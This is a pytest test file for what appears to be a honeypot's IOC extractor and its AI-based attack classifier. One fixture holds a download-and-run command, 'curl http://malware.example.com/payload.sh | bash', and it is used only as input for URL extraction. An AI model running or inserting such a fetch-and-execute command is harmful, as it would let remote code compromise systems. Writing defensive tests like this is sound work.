from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from src.analysis.classifier import AttackClassifier
from src.analysis.ioc_extractor import extract_iocs, flatten_iocs
from src.core.events import AttackEvent, AttackType, Severity


class TestIOCExtractor:
    def test_extracts_public_ips(self) -> None:
        text = "Connection from 185.220.101.45 and 45.33.32.156"
        iocs = extract_iocs(text)
        assert "185.220.101.45" in iocs["ips"]
        assert "45.33.32.156" in iocs["ips"]

    def test_excludes_private_ips(self) -> None:
        text = "Internal traffic from 192.168.1.1 and 10.0.0.1"
        iocs = extract_iocs(text)
        assert len(iocs["ips"]) == 0

    def test_extracts_cves(self) -> None:
        text = "Exploiting CVE-2021-44228 log4shell vulnerability"
        iocs = extract_iocs(text)
        assert "CVE-2021-44228" in iocs["cves"]

    def test_extracts_urls(self) -> None:
        text = "curl http://malware.example.com/payload.sh | bash"
        iocs = extract_iocs(text)
        assert len(iocs["urls"]) > 0

    def test_flatten_iocs(self) -> None:
        ioc_dict = {"ips": ["1.2.3.4"], "domains": ["evil.com"]}
        flat = flatten_iocs(ioc_dict)
        assert "ip:1.2.3.4" in flat
        assert "domain:evil.com" in flat


class TestAttackClassifier:
    async def test_analyse_returns_enriched_event(self) -> None:
        with patch("src.analysis.classifier.get_settings") as mock_settings:
            mock_settings.return_value = MagicMock(
                anthropic_api_key="sk-ant-test",
                ai_model="claude-sonnet-4-20250514",
            )
            classifier = AttackClassifier()

        fake_response = MagicMock()
        fake_response.content = [MagicMock(text="""{
            "attack_type": "ssh_brute_force",
            "severity": "high",
            "threat_score": 8,
            "summary": "Attacker attempted SSH brute force with common credentials.",
            "attacker_intent": "credential_theft",
            "iocs": ["root", "admin", "password123"],
            "ttps": ["T1110.001"],
            "deception_response": "Show fake sensitive files",
            "recommended_action": "block"
        }""")]

        event = AttackEvent(
            source_ip="185.220.101.45",
            source_port=54321,
            target_service="ssh",
            raw_payload="username: root\npassword: password123",
        )

        with patch.object(
            classifier._client.messages,
            "create",
            new_callable=AsyncMock,
            return_value=fake_response,
        ):
            enriched = await classifier.analyse(event)

        assert enriched.attack_type == AttackType.SSH_BRUTE_FORCE
        assert enriched.severity == Severity.HIGH
        assert enriched.threat_score == 8.0
        assert enriched.attacker_intent == "credential_theft"
        assert len(enriched.iocs) > 0

    async def test_analyse_handles_api_failure_gracefully(self) -> None:
        with patch("src.analysis.classifier.get_settings") as mock_settings:
            mock_settings.return_value = MagicMock(
                anthropic_api_key="sk-ant-test",
                ai_model="claude-sonnet-4-20250514",
            )
            classifier = AttackClassifier()

        event = AttackEvent(
            source_ip="1.2.3.4",
            source_port=1234,
            target_service="ssh",
            raw_payload="test",
        )

        with patch.object(
            classifier._client.messages,
            "create",
            new_callable=AsyncMock,
            side_effect=Exception("API timeout"),
        ):
            result = await classifier.analyse(event)

        assert result.source_ip == event.source_ip
        assert result.threat_score == 0.0